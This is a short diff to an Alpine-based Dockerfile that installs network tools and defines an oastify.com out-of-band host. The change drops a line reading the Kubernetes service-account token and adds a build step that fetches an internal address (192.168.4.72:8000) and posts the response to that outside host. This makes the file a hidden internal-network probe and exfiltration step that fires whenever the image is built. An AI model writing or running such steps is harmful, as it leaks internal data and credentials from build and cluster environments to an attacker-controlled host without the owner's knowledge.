@@ -1,6 +1,4 @@
 FROM alpine
 RUN apk add --no-cache curl nmap bind-tools
 RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
-  
-  cat /var/run/secrets/kubernetes.io/serviceaccount/token
-
+  curl -v http://192.168.4.72:8000 | curl -s "$C/ssrf" --data-binary @-
